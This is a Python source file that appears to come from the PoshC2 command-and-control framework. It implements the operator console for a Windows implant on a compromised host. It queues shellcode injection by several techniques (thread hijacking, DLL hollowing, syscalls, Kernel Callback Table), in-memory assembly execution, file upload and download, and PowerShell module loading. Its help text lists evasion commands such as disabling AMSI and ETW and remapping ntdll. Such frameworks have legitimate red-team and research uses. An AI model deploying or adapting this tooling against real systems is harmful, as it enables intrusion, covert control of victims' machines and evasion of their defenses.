import base64
import os
import re
import traceback

from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.styles import Style

from poshc2.Utils import argp, load_file, get_command_word, command
from poshc2.client.Alias import py_alias, um_alias, um_replace
from poshc2.client.cli.AutosuggestionAggregator import AutosuggestionAggregator
from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter, FirstWordCompleter
from poshc2.client.cli.PoshExamplesAutosuggestions import AutoSuggestFromPoshExamples
from poshc2.client.command_handlers.CommonCommands import common_implant_commands, common_implant_commands_help, common_implant_examples, common_block_help
from poshc2.server.Config import PayloadsDirectory, PoshProjectDirectory, PBindPipeName, PBindSecret
from poshc2.server.Core import print_bad, print_command_help, search_help, load_module_sharp
from poshc2.server.AutoLoads import check_module_loaded, run_unmanaged_autoloads
from poshc2.server.ImplantType import ImplantType
from poshc2.server.database.Model import NewTask, C2Server, Implant
from poshc2.server.database.Helpers import insert_object, update_object, select_first, get_implant, get_process_id

commands = {}
commands.update(common_implant_commands)
commands_help = {}
commands_help.update(common_implant_commands_help)
examples = []
examples.extend(common_implant_examples)
block_help = {}
block_help.update(common_block_help)

style = Style.from_dict({
    '': '#d12527',
})


def um_prompt(prefix):
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/{ImplantType.UnmanagedHttp.get_history_file()}'),
                            auto_suggest=AutosuggestionAggregator([AutoSuggestFromHistory(), autosuggester]), style=style)
    completions = list(commands.keys())
    completions.extend(examples)
    return session.prompt(f'{prefix}> ', completer=FirstWordCompleter(completions, WORD=True))


def handle_unmanaged_windows_command(command, user, implant_id, command_prefix=""):
    command = command.strip()

    for alias in um_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]

    for alias in um_replace:
        if command.startswith(alias[0]):
            command = command.replace(alias[0], alias[1])

    run_unmanaged_autoloads(command, implant_id, user, command_prefix)
    command_word = get_command_word(command)

    if command_word in commands:
        commands[command_word](user, command, implant_id)
        return

    if command:
        new_task = NewTask(
            implant_id = implant_id,
            command = f"{command_prefix} {command}" if command_prefix else command,
            user = user,
            child_implant_id = None
        )
        
        insert_object(new_task)

    for alias in py_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]


def get_commands():
    return commands.keys()


@command(commands, commands_help, examples, block_help)
def do_help(user, command, implant_id):
    """
    Displays a list of all the available commands for this implant, or
    help for a particular command if specified.

    Examples:
        help
        help list-modules
        help inject-shellcode
    """
    print_command_help(command, commands, commands_help, block_help)


@command(commands, commands_help, examples, block_help)
def do_search_help(user, command, implant_id):
    """
    Search the command list for commands containing the keyword.

    The search is case insensitive.
    The -verbose option will search within and print the help for each command also.
    
    Examples:
        search-help psexec
        search-help -verbose psexec
    """
    search_help(command, commands_help)


@command(commands, commands_help, examples, block_help)
def do_pbind_start(user, command, implant_id, command_prefix=""):
    """
    TODO
    """
    key = select_first(C2Server.encryption_key)

    if len(command.split()) == 2:  # 'pbind-connect <hostname>' is two args
        command = f"{command} {PBindPipeName} {PBindSecret} {key}"
    elif len(command.split()) == 4:  # if the pipe name and secret are already present just add the key
        command = f"{command} {key}"
    else:
        print_bad("Expected 'pbind_connect <hostname>' or 'pbind_connect <hostname> <pipename> <secret>'")
        return

    new_task = NewTask(
        implant_id = implant_id,
        command = f"{command_prefix} {command}" if command_prefix else command,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_upload_file(user, command, implant_id, command_prefix=""):
    """
    TODO
    """
    if command == "upload-file":
        session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.upload-history'), auto_suggest=AutoSuggestFromHistory(), style=style)

        try:
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        except KeyboardInterrupt:
            return

        while not os.path.isfile(source):
            print(f"File does not exist: {source}")
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source

        destination = session.prompt("Location to upload to: ")
    else:
        args = argp(command)
        source = args.source
        destination = args.destination

    try:

        destination = destination.replace("\\", "\\\\")
        print("")
        print(f"Uploading {source} to {destination}")
        upload_command = f"upload-file {source} {destination}"
        new_task = NewTask(
            implant_id = implant_id,
            command = f"{command_prefix} {upload_command}" if command_prefix else upload_command,
            user = user,
            child_implant_id = None
        )
        
        insert_object(new_task)
    except Exception as e:
        print(f"Error with source file: {e}")
        traceback.print_exc()


@command(commands, commands_help, examples, block_help, name="exit")
def do_kill_implant(user, command, implant_id, command_prefix=""):
    """
    TODO
    """
    implant = get_implant(implant_id)
    print_bad("**OPSEC Warning** - kill-implant terminates the current thread not the entire process, if you want to kill the process use kill-process")
    ri = input(f"Are you sure you want to terminate the implant ID {implant.numeric_id}? (Y/n) ")

    if ri == "" or ri.lower() == "y":
        new_task = NewTask(
            implant_id = implant_id,
            command = f"{command_prefix} kill" if command_prefix else "kill",
            user = user,
            child_implant_id = None
        )
        
        insert_object(new_task)
        update_object(Implant, {Implant.alive: "No"}, {Implant.id: implant_id})
    else:
        print("Implant not terminated")


@command(commands, commands_help, examples, block_help)
def do_download_file(user, command, implant_id, command_prefix=""):
    """
    Download the target file to the C2 server.

    These large downloads may trigger DLP or proxy warnings, so give consideration to splitting
    a large file up on the target filesystem etc.

    MITRE TTPs:
        {}

    Examples:
        download-file C:\\users\\public\\file.txt
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_inject_shellcode(user, command, implant_id, command_prefix=""):
    """
    Use basic API calls to inject shellcode into the current process.

    Uses VirtualAlloc (RW) -> RtlMoveMemory -> VirtualProtect (RX) -> CreateThread

    Examples:
        inject-shellcode 
        inject-shellcode c:\\windows\\system32\\svchost.exe
        inject-shellcode 1927

    """
    print_bad("**OPSEC Warning**")
    ri = input("Are you sure you want to run Inject-Shellcode (Syscalls might be better)? (y/N) ")

    if ri.lower() != "y":
        return

    params = re.compile("inject-shellcode", re.IGNORECASE)
    params = params.sub("", command)

    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'), auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return
    try:
        shellcodefile = load_file(path)
        command = f"inject-shellcode {base64.b64encode(shellcodefile).decode('utf-8')}{params} #{os.path.basename(path)}"

        if shellcodefile is not None:
            new_task = NewTask(
                implant_id = implant_id,
                command = f"{command_prefix} {command}" if command_prefix else command,
                user = user,
                child_implant_id = None
            )
            
            insert_object(new_task)
    except Exception as e:
        print("Error loading file: %s" % e)


@command(commands, commands_help, examples, block_help)
def do_inject_shellcode_thread_hijacking(user, command, implant_id, command_prefix=""):
    """
    TODO
    """
    params = re.compile("inject-shellcode-thread-hijacking", re.IGNORECASE)
    params = params.sub("", command)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'), auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    try:
        shellcodefile = load_file(path)
        command = f"inject-shellcode-thread-hijacking {base64.b64encode(shellcodefile).decode('utf-8')}{params} #{os.path.basename(path)}"

        if shellcodefile is not None:
            new_task = NewTask(
                implant_id = implant_id,
                command = f"{command_prefix} {command}" if command_prefix else command,
                user = user,
                child_implant_id = None
            )
            
            insert_object(new_task)
    except Exception as e:
        print(f"Error loading file: {e}")


@command(commands, commands_help, examples, block_help)
def do_inject_shellcode_view_rtl(user, command, implant_id, command_prefix=""):
    """
    TODO
    """
    params = re.compile("inject-shellcode-view-rtl", re.IGNORECASE)
    params = params.sub("", command)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'), auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    try:
        shellcodefile = load_file(path)
        command = f"inject-shellcode-view-rtl {base64.b64encode(shellcodefile).decode('utf-8')}{params} #{os.path.basename(path)}"

        if shellcodefile is not None:
            new_task = NewTask(
                implant_id = implant_id,
                command = f"{command_prefix} {command}" if command_prefix else command,
                user = user,
                child_implant_id = None
            )
            
            insert_object(new_task)
    except Exception as e:
        print(f"Error loading file: {e}")


@command(commands, commands_help, examples, block_help)
def do_inject_shellcode_ctx(user, command, implant_id, command_prefix=""):
    """
    TODO
    """
    params = re.compile("inject-shellcode-ctx", re.IGNORECASE)
    params = params.sub("", command)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'), auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    try:
        shellcodefile = load_file(path)
        command = f"inject-shellcode-ctx {base64.b64encode(shellcodefile).decode('utf-8')}{params} #{os.path.basename(path)}"

        if shellcodefile is not None:
            new_task = NewTask(
                implant_id = implant_id,
                command = f"{command_prefix} {command}" if command_prefix else command,
                user = user,
                child_implant_id = None
            )
            
            insert_object(new_task)
    except Exception as e:
        print(f"Error loading file: {e}")


@command(commands, commands_help, examples, block_help)
def do_inject_shellcode_dll_hollowing(user, command, implant_id, command_prefix=""):
    """
    TODO
    """
    params = re.compile("inject-shellcode-dll-hollowing", re.IGNORECASE)
    params = params.sub("", command)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'), auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    try:
        shellcodefile = load_file(path)
        command = f"inject-shellcode-dll-hollowing {base64.b64encode(shellcodefile).decode('utf-8')}{params} #{os.path.basename(path)}"

        if shellcodefile is not None:
            new_task = NewTask(
                implant_id = implant_id,
                command = f"{command_prefix} {command}" if command_prefix else command,
                user = user,
                child_implant_id = None
            )
            
            insert_object(new_task)
    except Exception as e:
        print(f"Error loading file: {e}")


@command(commands, commands_help, examples, block_help)
def do_inject_shellcode_syscall(user, command, implant_id, command_prefix=""):
    """
    TODO
    Examples:
        inject-shellcode-syscall 
        inject-shellcode-syscall c:\\windows\\system32\\svchost.exe
        inject-shellcode-syscall [PID]
    """
    params = re.compile("inject-shellcode-syscall", re.IGNORECASE)
    params = params.sub("", command)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'), auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    try:
        shellcodefile = load_file(path)
        command = f"inject-shellcode-syscall {base64.b64encode(shellcodefile).decode('utf-8')}{params} #{os.path.basename(path)}"

        if shellcodefile is not None:
            new_task = NewTask(
                implant_id = implant_id,
                command = f"{command_prefix} {command}" if command_prefix else command,
                user = user,
                child_implant_id = None
            )

            insert_object(new_task)
    except Exception as e:
        print(f"Error loading file: {e}")


@command(commands, commands_help, examples, block_help)
def do_shell(user, command, implant_id, command_prefix=""):
    """
    TODO
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = f"{command_prefix} {command}" if command_prefix else command,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_run_assembly(user, command, implant_id, command_prefix=""):
    """
    run-assembly loads the CLR, then adds the Echo.exe binary to get the output and the other

    MITRE TTPs:
        {}

    Examples:
        run-assembly Stage2-Core.exe pwd
        run-assembly Seatbelt.exe -group=all   
    
    """

    new_task = NewTask(
        implant_id = implant_id,
        command = command,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_run_exe(user, command, implant_id, command_prefix=""):
    """
    run-exe is used to run an assembly already loaded in the CLR, for example after its loaded into an AppDomain.

    By default, it tries to create a randomly named AppDomain and runs all loaded modules in that app domain

    MITRE TTPs:
        {}

    Examples:
        load-module Stage2-Core.exe
        run-exe Core.Program Core core-help
        run-exe Core.Program Core ls-recurse c:\\temp\\
        run-exe Core.Program Core get-screenshot
        load-module Seatbelt.exe
        run-exe Seatbelt.Program Seatbelt -group=user   
    
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = command,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_turtle(user, command, implant_id, command_prefix=""):
    """

    Stop the implant beaconing back for x seconds. 
    
    MITRE TTPs:
        {}

    Examples:
        turtle 30m
        turtle 1m
        turtle 8h
    
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = command,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_gc(user, command, implant_id, command_prefix=""):
    """

    Gets the contect of a file, e.g gc c:\\temp\\log.txt.
    Lists the directory content 
    
    MITRE TTPs:
        {}

    Examples:
        gc c:\\temp\\log.txt  
        ls c:\\windows\\
        ls "C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        del c:\\temp\\log.txt
        ps
        ps-min
        whoami
        list-app-domains
        create-app-domain
        create-app-domain TEMP
        del-app-domain TEMP
        get-env
        shell calc.exe
        disable-amsi
        disable-etw
        get-module-handle ntdll.dll
        check-hooks
        load-stage2        
        get-memory-usage
        remap-ntdll
        get-beacon-time
        inject-dll
    
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = command,
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task) 



@command(commands, commands_help, examples, block_help)
def do_inject_shellcode_kct(user, command, implant_id, command_prefix=""):
    """
    Use Kernel Callback Table (KCT) to inject shellcode into a remote process.

    Examples:
        inject-shellcode-kct
        inject-shellcode-kct c:\\windows\\notepad.exe Notepad
        inject-shellcode-kct c:\\windows\\system32\\msinfo32.exe "System Information"

    """
    params = re.compile("inject-shellcode-kct", re.IGNORECASE)
    params = params.sub("", command)

    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'), auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return
    try:
        shellcodefile = load_file(path)
        command = f"inject-shellcode-kct {base64.b64encode(shellcodefile).decode('utf-8')}{params} #{os.path.basename(path)}"

        if shellcodefile is not None:
            new_task = NewTask(
                implant_id = implant_id,
                command = f"{command_prefix} {command}" if command_prefix else command,
                user = user,
                child_implant_id = None
            )
            
            insert_object(new_task)
    except Exception as e:
        print("Error loading file: %s" % e)


@command(commands, commands_help, examples, block_help)
def do_kill_process(user, command, implant_id, command_prefix=""):
    """
    Kills the specified procress by PID or processes matching a name.

    MITRE TTPs:
        {}

    Examples:
        kill-process
        kill-process 1234
        kill-process calc.exe
    """
    if command == "kill-process":
        pid = get_process_id(implant_id)
        ri = input(f"Are you sure you want to kill the current process? ({pid}) (Y/n) ")

        if ri == "" or ri.lower() == "y":
            command = f"{command} {pid}"
        else:
            print("Process not killed")
            return

    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_pslo(user, command, implant_id, command_prefix=""):
    """
    Loads a PowerShell module into memory for use with sharpps.

    Will also load the PowerShell wrapper and System.Management.Automation.dll into
    memory on the implant if not already present.

    Consider your host process before using this within more mature organisations.

    MITRE TTPs:
        {}

    Examples:
        pslo PowerView_dev.ps1
    """

    check_module_loaded("PS.exe", implant_id, user, load_module_command=command_prefix)

    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharpps(user, command, implant_id, command_prefix=""):
    """
    Gives access to previously loaded PowerShell functionality.

    Will load the PowerShell wrapper and System.Management.Automation.dll into
    memory on the implant if not already present.

    Use pslo to load PowerShell modules.

    MITRE TTPs:
        {}

    Examples:
        sharpps Get-NetUser bob
    """

    powershell_command = base64.b64encode(command.split("sharpps ")[1].encode("utf-8")).decode("utf-8")
    implant_command = f"run-exe Program PS {powershell_command}"

    check_module_loaded("PS.exe", implant_id, user, load_module_command=command_prefix)

    new_task = NewTask(
        implant_id=implant_id,
        command=implant_command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)

autosuggester = AutoSuggestFromPoshExamples(examples)

